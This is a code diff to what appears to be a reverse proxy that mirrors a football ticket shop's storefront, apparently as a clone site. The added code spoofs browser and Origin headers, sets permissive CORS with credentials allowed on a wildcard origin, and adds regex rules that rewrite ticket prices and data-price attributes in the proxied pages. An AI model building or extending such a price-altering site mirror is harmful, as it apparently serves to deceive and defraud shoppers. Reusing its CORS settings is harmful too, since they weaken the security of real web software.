@@ -131,10 +131,16 @@ app.get('/cdn/fonts/*', (req, res, next) => {
     changeOrigin: true,
     secure: true,
     timeout: 10000,
+    onProxyReq: (proxyReq, req, res) => {
+      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+      proxyReq.setHeader('Accept', '*/*');
+      proxyReq.setHeader('Origin', 'https://footballrevers-production.up.railway.app');
+    },
     onProxyRes: (proxyRes, req, res) => {
       proxyRes.headers['Access-Control-Allow-Origin'] = '*';
       proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
       proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
       proxyRes.headers['Content-Type'] = 'font/woff2';
       proxyRes.headers['Cache-Control'] = 'public, max-age=31536000';
     }
@@ -149,10 +155,16 @@ app.get('/cdn/shop/t/*', (req, res, next) => {
     changeOrigin: true,
     secure: true,
     timeout: 10000,
+    onProxyReq: (proxyReq, req, res) => {
+      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+      proxyReq.setHeader('Accept', 'application/javascript, */*');
+      proxyReq.setHeader('Origin', 'https://footballrevers-production.up.railway.app');
+    },
     onProxyRes: (proxyRes, req, res) => {
       proxyRes.headers['Access-Control-Allow-Origin'] = '*';
       proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
       proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
       proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
       proxyRes.headers['Cache-Control'] = 'public, max-age=31536000';
     }
@@ -405,7 +417,14 @@ const proxyOptions = {
           { pattern: /USD\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD $', suffix: '' },
           { pattern: /USD\s+(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD ', suffix: '' },
           { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '', suffix: ' USD' },
-          { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' }
+          { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' },
+          // Добавляем паттерны для цен без USD
+          { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g, prefix: '', suffix: ' /ticket' },
+          { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*per\s+ticket/g, prefix: '', suffix: ' per ticket' },
+          // Паттерны для data атрибутов
+          { pattern: /data-price="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-price="', suffix: '"' },
+          { pattern: /data-amount="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-amount="', suffix: '"' },
+          { pattern: /data-cost="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-cost="', suffix: '"' }
         ];
         
         pricePatterns.forEach(({ pattern, prefix, suffix }) => {
